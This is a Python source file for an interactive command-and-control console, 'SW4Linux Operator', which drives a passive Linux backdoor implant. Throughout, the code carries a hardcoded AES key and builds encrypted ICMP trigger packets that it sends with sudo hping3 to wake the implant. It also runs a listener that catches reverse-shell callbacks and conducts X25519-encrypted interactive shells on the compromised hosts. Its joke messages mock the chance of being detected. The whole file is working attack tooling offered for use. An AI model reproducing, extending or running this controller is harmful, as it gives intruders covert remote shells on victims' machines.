#!/usr/bin/env python3
"""
SW4Linux Operator - A stylish C2 controller for the SW4Linux passive implant.
Combines listener, packet crafting, and session management into one CLI.
"""

import os
import sys
import socket
import struct
import time
import threading
import readline
import subprocess
import select
from datetime import datetime
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.asymmetric.x25519 import X25519PrivateKey, X25519PublicKey
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives import hashes
from pathlib import Path

# Color codes for that slick Sliver aesthetic
class Color:
    HEADER = "\033[95m"
    BLUE = "\033[94m"
    CYAN = "\033[96m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    RED = "\033[91m"
    ENDC = "\033[0m"
    BOLD = "\033[1m"
    UNDERLINE = "\033[4m"
    DIM = "\033[2m"

OPSEC_JOKES = [
    "beware of IDS alarms, this shell is now being logged to syslog, journal, auditd, and probably a file on disk somewhere 👀",
    "you're about to broadcast your intentions to every security tool in the neighborhood. nice OPSEC 😎",
    "this reverse shell will show up in netstat, lsof, ss, and every forensics tool ever created. live dangerously!",
    "your shell is about to light up like a Christmas tree on every SOC's radar. godspeed.",
    "if there's a monitoring agent, it's gonna have a field day with this. at least the event log will be entertaining.",
    "remember: process history, network connections, and your mom's WiFi router logs will all record this 🎭",
    "this is basically a neon sign saying 'hi, I'm here' to anyone watching. artistic choice, really.",
]

class Session:
    """Represents a caught implant session."""
    def __init__(self, sid, remote_ip, local_ip, port, timestamp, sock=None):
        self.sid = sid
        self.remote_ip = remote_ip
        self.local_ip = local_ip
        self.port = port
        self.timestamp = timestamp
        self.active = True
        self.sock = sock  # The actual socket connection

    def __repr__(self):
        status = f"{Color.GREEN}✓{Color.ENDC}" if self.active else f"{Color.RED}✗{Color.ENDC}"
        return f"[{self.sid}] {status} {self.remote_ip:15} → {self.local_ip}:{self.port} ({self.timestamp})"

class SW4LinuxOperator:
    def __init__(self):
        self.key = self._load_key()
        self.aesgcm = AESGCM(self.key)
        self.sessions = {}
        self.session_counter = 0
        self.listener = None
        self.listener_thread = None
        self.listening = False
        self.shell_nonce_counter = {}  # Track nonce counters per session

        print(self._banner())

    def _banner(self):
        """Return the banner."""
        banner = f"""
{Color.CYAN}{Color.BOLD}
╔═════════════════════════════════════════════════════════════╗
║              SW4Linux Operator v1.0                         ║
║   A passive implant controller for Linux                    ║
║   Based on SLEEPWALKER by @HackingLZ                        ║
╚═════════════════════════════════════════════════════════════╝
{Color.ENDC}
{Color.DIM}[*] Payload: ICMP echo with AES-GCM encryption{Color.ENDC}
{Color.DIM}[*] Magic marker: SW4L (4 bytes){Color.ENDC}
{Color.DIM}[*] Transport: Raw ICMP over the network{Color.ENDC}
"""
        return banner

    def _load_key(self):
        """
        Load encryption key (hardcoded for convenience).
        This key is also visible in src/crypto.c and is not secret.
        It's used to encrypt the trigger packet for the passive implant.
        """
        # Static AES-256 key reconstructed from crypto.c obfuscation
        key = bytes.fromhex("8bcd104494eec7f111384c0f1f7e29b8167a2072a6c2344cc9715c67bbb22ed5")

        if len(key) != 32:
            print(f"{Color.RED}[!] Key must be 32 bytes (256-bit){Color.ENDC}")
            sys.exit(1)

        print(f"{Color.GREEN}[+] Key loaded: {key.hex()[:16]}...{Color.ENDC}")
        return key

    def _craft_packet(self, port, target_ip):
        """Craft a magic packet with AES-GCM encryption."""
        nonce = os.urandom(12)
        message = b"Open sesame" + struct.pack(">H", port)
        ciphertext = self.aesgcm.encrypt(nonce, message, associated_data=None)

        payload = b"SW4L"
        payload += nonce
        payload += ciphertext
        payload += os.urandom(11)

        return payload, nonce

    def _send_packet(self, target_ip, port, payload):
        """Send crafted packet as ICMP echo using hping3."""
        try:
            # Write payload to temp file
            with open("/tmp/sw4l_payload.bin", "wb") as f:
                f.write(payload)

            # Send with hping3
            cmd = ["sudo", "hping3", "-1", "-E", "/tmp/sw4l_payload.bin",
                   "-d", str(len(payload)), "-c", "1", target_ip]

            result = subprocess.run(cmd, capture_output=True, timeout=5)

            if result.returncode == 0:
                return True, "Packet sent successfully"
            else:
                return False, result.stderr.decode('utf-8', errors='ignore')

        except subprocess.TimeoutExpired:
            return False, "hping3 timeout"
        except Exception as e:
            return False, str(e)
        finally:
            # Clean up
            try:
                os.remove("/tmp/sw4l_payload.bin")
            except:
                pass

    def _start_listener(self, listen_ip, listen_port):
        """Start a listener for reverse shell callbacks."""
        self.listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.listener.bind((listen_ip, listen_port))
        self.listener.listen(5)
        self.listener.settimeout(1.0)

        print(f"{Color.GREEN}[+] Listener started on {listen_ip}:{listen_port}{Color.ENDC}")
        self.listening = True

        while self.listening:
            try:
                conn, (remote_ip, remote_port) = self.listener.accept()
                self._handle_session(conn, remote_ip, remote_port)
            except socket.timeout:
                continue
            except Exception as e:
                if self.listening:
                    print(f"{Color.RED}[-] Listener error: {e}{Color.ENDC}")

    def _handle_session(self, conn, remote_ip, remote_port):
        """Handle an incoming reverse shell session."""
        self.session_counter += 1
        sid = f"SW4L-{self.session_counter:04d}"

        timestamp = datetime.now().strftime("%H:%M:%S")
        session = Session(sid, remote_ip, socket.gethostbyname(socket.gethostname()),
                         remote_port, timestamp, sock=conn)

        self.sessions[sid] = session

        print(f"\n{Color.GREEN}[+] Got shell!{Color.ENDC}")
        print(f"{Color.BLUE}[*] Session ID: {sid}{Color.ENDC}")
        print(f"{Color.BLUE}[*] Remote: {remote_ip}{Color.ENDC}")
        print(f"{Color.CYAN}(sw4l) >{Color.ENDC} ", end="", flush=True)

    def _perform_key_exchange(self, sid, sock):
        """Perform X25519 key exchange with the malware client."""
        try:
            # Generate server's X25519 keypair
            server_private = X25519PrivateKey.generate()
            server_public = server_private.public_key()
            server_public_bytes = server_public.public_bytes_raw()

            # Receive client's public key (32 bytes)
            client_public_bytes = sock.recv(32)
            if len(client_public_bytes) != 32:
                print(f"{Color.RED}[-] Invalid client public key length{Color.ENDC}")
                return None

            # Compute shared secret using server's private key and client's public key
            client_public = X25519PublicKey.from_public_bytes(client_public_bytes)
            shared_secret = server_private.exchange(client_public)

            # Derive AES-256 key from shared secret using HKDF-SHA256
            hkdf = HKDF(
                algorithm=hashes.SHA256(),
                length=32,
                salt=None,
                info=b"shell_encryption_key",
            )
            session_key = hkdf.derive(shared_secret)

            # Send server's public key to client
            sock.send(server_public_bytes)

            # Store session key and nonce counter
            self.sessions[sid].session_key = session_key
            self.shell_nonce_counter[sid] = 0

            print(f"{Color.GREEN}[+] X25519 key exchange completed{Color.ENDC}")
            print(f"{Color.DIM}[*] Session key derived: {session_key.hex()[:16]}...{Color.ENDC}")

            return session_key
        except Exception as e:
            print(f"{Color.RED}[-] Key exchange failed: {e}{Color.ENDC}")
            return None

    def _encrypt_shell_data(self, sid, data):
        """Encrypt data for shell communication."""
        if sid not in self.sessions or not hasattr(self.sessions[sid], 'session_key'):
            return None

        key = self.sessions[sid].session_key
        nonce_counter = self.shell_nonce_counter.get(sid, 0)
        nonce = struct.pack("<Q", nonce_counter) + os.urandom(4)
        self.shell_nonce_counter[sid] = nonce_counter + 1

        aesgcm = AESGCM(key)
        ciphertext = aesgcm.encrypt(nonce, data, None)
        tag = ciphertext[-16:]
        ct = ciphertext[:-16]

        # Packet format: nonce(12) + ciphertext + tag(16)
        packet = nonce + ct + tag
        return packet

    def _decrypt_shell_data(self, sid, packet):
        """Decrypt data from shell communication."""
        if sid not in self.sessions or not hasattr(self.sessions[sid], 'session_key'):
            return None

        if len(packet) < 28:  # 12 byte nonce + 16 byte tag minimum
            return None

        key = self.sessions[sid].session_key
        nonce = packet[:12]
        tag = packet[-16:]
        ciphertext = packet[12:-16]

        try:
            aesgcm = AESGCM(key)
            plaintext = aesgcm.decrypt(nonce, ciphertext + tag, None)
            return plaintext
        except Exception as e:
            print(f"{Color.RED}[-] Decryption failed: {e}{Color.ENDC}")
            return None

    def _interact_shell(self, session):
        """Interactive bidirectional shell handler with X25519 encryption."""
        import random
        print(f"\n{Color.YELLOW}[!] {random.choice(OPSEC_JOKES)}{Color.ENDC}\n")

        print(f"{Color.GREEN}[+] Spawning interactive shell on {session.remote_ip}{Color.ENDC}")
        print(f"{Color.DIM}[*] Performing X25519 key exchange...{Color.ENDC}")

        # Perform key exchange
        session_key = self._perform_key_exchange(session.sid, session.sock)
        if not session_key:
            print(f"{Color.RED}[-] Key exchange failed, aborting shell{Color.ENDC}")
            return

        print(f"{Color.DIM}[*] Type 'exit' or Ctrl+D to return to operator menu{Color.ENDC}")
        print(f"{Color.DIM}{'─' * 70}{Color.ENDC}\n")

        sock = session.sock
        sock.settimeout(0.1)

        try:
            while True:
                # Check if socket has encrypted data
                ready = select.select([sock], [], [], 0.1)
                if ready[0]:
                    try:
                        # Receive length prefix (4 bytes, network byte order)
                        len_data = sock.recv(4)
                        if len(len_data) < 4:
                            print(f"\n{Color.RED}[-] Connection closed by remote{Color.ENDC}")
                            session.active = False
                            break

                        packet_len = struct.unpack(">I", len_data)[0]
                        if packet_len > 8192:  # Sanity check
                            print(f"\n{Color.RED}[-] Invalid packet length{Color.ENDC}")
                            break

                        # Receive encrypted packet
                        packet = sock.recv(packet_len)
                        if len(packet) < packet_len:
                            print(f"\n{Color.RED}[-] Incomplete packet{Color.ENDC}")
                            break

                        # Decrypt
                        plaintext = self._decrypt_shell_data(session.sid, packet)
                        if plaintext is None:
                            continue

                        sys.stdout.write(plaintext.decode('utf-8', errors='ignore'))
                        sys.stdout.flush()
                    except socket.timeout:
                        continue
                    except Exception as e:
                        print(f"\n{Color.RED}[-] Receive error: {e}{Color.ENDC}")
                        break

                # Read from stdin
                try:
                    user_input = sys.stdin.read(1)
                    if user_input:
                        # Encrypt and send
                        encrypted_packet = self._encrypt_shell_data(session.sid, user_input.encode())
                        if encrypted_packet:
                            packet_len = struct.pack(">I", len(encrypted_packet))
                            sock.send(packet_len + encrypted_packet)
                except:
                    pass

        except KeyboardInterrupt:
            print(f"\n{Color.YELLOW}[*] Disconnecting...{Color.ENDC}")
        except Exception as e:
            print(f"\n{Color.RED}[-] Shell error: {e}{Color.ENDC}")
        finally:
            print(f"{Color.DIM}{'─' * 70}{Color.ENDC}")
            print(f"{Color.BLUE}[*] Returned to operator menu{Color.ENDC}")

    def _interact_menu(self, session):
        """Show interaction menu for a session."""
        while True:
            print(f"\n{Color.BOLD}Session: {session.sid} ({session.remote_ip}){Color.ENDC}")
            print(f"{Color.DIM}{'─' * 70}{Color.ENDC}")
            print(f"  {Color.CYAN}[1]{Color.ENDC} getshell    - Spawn interactive reverse shell")
            print(f"  {Color.CYAN}[2]{Color.ENDC} info        - Show session information")
            print(f"  {Color.CYAN}[3]{Color.ENDC} back        - Return to main menu")
            print(f"{Color.DIM}{'─' * 70}{Color.ENDC}")

            try:
                choice = input(f"{Color.CYAN}session >{Color.ENDC} ").strip().lower()

                if choice == "1" or choice == "getshell":
                    if not session.active or session.sock is None:
                        print(f"{Color.RED}[-] Session is inactive{Color.ENDC}")
                        break
                    self._interact_shell(session)

                elif choice == "2" or choice == "info":
                    print(f"\n{Color.BOLD}Session Information:{Color.ENDC}")
                    print(f"  ID:       {session.sid}")
                    print(f"  Remote:   {session.remote_ip}")
                    print(f"  Local:    {session.local_ip}:{session.port}")
                    print(f"  Time:     {session.timestamp}")
                    print(f"  Status:   {Color.GREEN if session.active else Color.RED}{'Active' if session.active else 'Inactive'}{Color.ENDC}")

                elif choice == "3" or choice == "back":
                    break

                else:
                    print(f"{Color.RED}[-] Invalid choice{Color.ENDC}")

            except KeyboardInterrupt:
                break
            except Exception as e:
                print(f"{Color.RED}[-] Menu error: {e}{Color.ENDC}")

    def cmd_listen(self, args):
        """Start listening for reverse shells."""
        if len(args) < 2:
            print(f"{Color.YELLOW}[!] Usage: listen <bind_ip> <port>{Color.ENDC}")
            print(f"{Color.DIM}     Example: listen 0.0.0.0 4444{Color.ENDC}")
            return

        bind_ip = args[0]
        try:
            port = int(args[1])
        except ValueError:
            print(f"{Color.RED}[-] Invalid port number{Color.ENDC}")
            return

        if self.listener_thread and self.listener_thread.is_alive():
            print(f"{Color.YELLOW}[!] Listener already running{Color.ENDC}")
            return

        self.listener_thread = threading.Thread(
            target=self._start_listener,
            args=(bind_ip, port),
            daemon=True
        )
        self.listener_thread.start()

    def cmd_send(self, args):
        """Send magic packet to trigger reverse shell."""
        if len(args) < 3:
            print(f"{Color.YELLOW}[!] Usage: send <target_ip> <listen_ip> <listen_port>{Color.ENDC}")
            print(f"{Color.DIM}     Example: send 192.168.1.100 192.168.1.50 4444{Color.ENDC}")
            return

        target_ip = args[0]
        listen_ip = args[1]
        try:
            listen_port = int(args[2])
        except ValueError:
            print(f"{Color.RED}[-] Invalid port number{Color.ENDC}")
            return

        print(f"{Color.BLUE}[*] Crafting magic packet...{Color.ENDC}")
        payload, nonce = self._craft_packet(listen_port, target_ip)

        print(f"{Color.BLUE}[*] Payload size: {len(payload)} bytes{Color.ENDC}")
        print(f"{Color.BLUE}[*] Nonce: {nonce.hex()}{Color.ENDC}")
        print(f"{Color.BLUE}[*] Target: {target_ip} → {listen_ip}:{listen_port}{Color.ENDC}")

        print(f"{Color.YELLOW}[*] Sending packet (requires sudo & hping3)...{Color.ENDC}")
        success, msg = self._send_packet(target_ip, listen_port, payload)

        if success:
            print(f"{Color.GREEN}[+] {msg}{Color.ENDC}")
        else:
            print(f"{Color.RED}[-] Send failed: {msg}{Color.ENDC}")

    def cmd_sessions(self, args):
        """List all active sessions."""
        if not self.sessions:
            print(f"{Color.YELLOW}[!] No sessions{Color.ENDC}")
            return

        print(f"\n{Color.BOLD}Session List:{Color.ENDC}")
        print(f"{Color.DIM}{'─' * 70}{Color.ENDC}")
        for sid, session in self.sessions.items():
            print(f"  {session}")
        print(f"{Color.DIM}{'─' * 70}{Color.ENDC}")

    def cmd_interact(self, args):
        """Interact with a session."""
        if len(args) < 1:
            print(f"{Color.YELLOW}[!] Usage: interact <session_id>{Color.ENDC}")
            return

        sid = args[0]
        if sid not in self.sessions:
            print(f"{Color.RED}[-] Session {sid} not found{Color.ENDC}")
            return

        session = self.sessions[sid]
        if not session.active:
            print(f"{Color.RED}[-] Session {sid} is inactive{Color.ENDC}")
            return

        self._interact_menu(session)

    def cmd_help(self, args):
        """Show help menu."""
        help_text = f"""
{Color.BOLD}Available Commands:{Color.ENDC}

  {Color.CYAN}listen{Color.ENDC} <bind_ip> <port>
    Start listening for reverse shell callbacks
    Example: {Color.DIM}listen 0.0.0.0 4444{Color.ENDC}

  {Color.CYAN}send{Color.ENDC} <target_ip> <listen_ip> <listen_port>
    Craft and send magic packet to trigger implant
    Example: {Color.DIM}send 192.168.1.100 192.168.1.50 4444{Color.ENDC}

  {Color.CYAN}sessions{Color.ENDC}
    List all active sessions

  {Color.CYAN}interact{Color.ENDC} <session_id>
    Interact with a session (opens menu)
    Example: {Color.DIM}interact SW4L-0001{Color.ENDC}

  {Color.CYAN}info{Color.ENDC}
    Show operator information

  {Color.CYAN}help{Color.ENDC}
    Show this help menu

  {Color.CYAN}exit{Color.ENDC}
    Exit the operator

{Color.DIM}Note: Most commands require sudo privileges for network operations.{Color.ENDC}
"""
        print(help_text)

    def cmd_info(self, args):
        """Show operator information."""
        info = f"""
{Color.BOLD}SW4Linux Operator Information:{Color.ENDC}

  {Color.CYAN}Key Status:{Color.ENDC}
    SHA256: {self._sha256_key()}

  {Color.CYAN}Network:{Color.ENDC}
    Listening: {Color.GREEN if self.listening else Color.RED}{'Yes' if self.listening else 'No'}{Color.ENDC}
    Sessions: {len(self.sessions)}

  {Color.CYAN}Protocol:{Color.ENDC}
    Magic Marker: SW4L (4 bytes)
    Encryption: AES-256-GCM
    Nonce: 12 bytes (random per packet)
    Transport: ICMP Echo Request

  {Color.CYAN}Architecture:{Color.ENDC}
    Target: Linux x64
    Implant Type: Passive backdoor
    Trigger: Magic packet via raw ICMP
    Callback: Reverse shell
"""
        print(info)

    def _sha256_key(self):
        """Return SHA256 of the key (for identification without exposing full key)."""
        import hashlib
        return hashlib.sha256(self.key).hexdigest()[:16]

    def run(self):
        """Main REPL loop."""
        print(f"{Color.CYAN}Type 'help' for available commands\n{Color.ENDC}")

        try:
            while True:
                try:
                    prompt = f"{Color.CYAN}(sw4l) >{Color.ENDC} "
                    user_input = input(prompt).strip()

                    if not user_input:
                        continue

                    parts = user_input.split()
                    cmd = parts[0].lower()
                    args = parts[1:]

                    if cmd == "listen":
                        self.cmd_listen(args)
                    elif cmd == "send":
                        self.cmd_send(args)
                    elif cmd == "sessions":
                        self.cmd_sessions(args)
                    elif cmd == "interact":
                        self.cmd_interact(args)
                    elif cmd == "info":
                        self.cmd_info(args)
                    elif cmd == "help":
                        self.cmd_help(args)
                    elif cmd == "exit" or cmd == "quit":
                        print(f"{Color.YELLOW}[*] Shutting down...{Color.ENDC}")
                        self.listening = False
                        if self.listener:
                            self.listener.close()
                        break
                    else:
                        print(f"{Color.RED}[-] Unknown command: {cmd}{Color.ENDC}")

                except KeyboardInterrupt:
                    print(f"\n{Color.YELLOW}[*] Shutting down...{Color.ENDC}")
                    self.listening = False
                    if self.listener:
                        self.listener.close()
                    break

        except EOFError:
            pass
        finally:
            print(f"{Color.DIM}[*] Operator closed{Color.ENDC}")
            sys.exit(0)

def main():
    # Check for required dependencies
    try:
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    except ImportError:
        print(f"{Color.RED}[!] cryptography library not found. Install with: pip3 install cryptography{Color.ENDC}")
        sys.exit(1)

    operator = SW4LinuxOperator()
    operator.run()

if __name__ == "__main__":
    main()
